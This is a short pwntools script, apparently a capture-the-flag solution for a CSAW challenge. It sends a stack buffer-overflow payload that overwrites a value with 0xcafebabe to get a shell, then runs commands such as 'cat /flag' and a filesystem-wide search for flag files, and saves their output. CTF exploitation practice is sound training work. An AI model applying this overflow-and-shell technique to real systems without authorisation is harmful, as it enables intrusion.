from pwn import *

HOST = 'pwn.chal.csaw.io'
PORT = 1436

TARGET = 0xcafebabe

r = remote(HOST, PORT)
r.recvuntil(b'Are you a big boiiiii??')
payload = b'A' * 20 + p32(TARGET, endian='little')
r.sendline(payload)

# Try sending shell commands after payload
def try_shell_command(r, cmd):
    r.sendline(cmd)
    return r.recvrepeat(0.5)

results = {}
for cmd in [b'ls', b'ls -la', b'cat *', b'cat /flag', b'find / -name "flag*" 2>/dev/null', b'echo *']:
    try:
        results[cmd.decode()] = try_shell_command(r, cmd)
    except Exception as e:
        results[cmd.decode()] = str(e)

with open('/home/ctfplayer/boi_shell_results.txt', 'w') as f:
    for cmd, output in results.items():
        f.write(f'COMMAND: {cmd}\nOUTPUT:\n{output}\n---\n')

r.close()

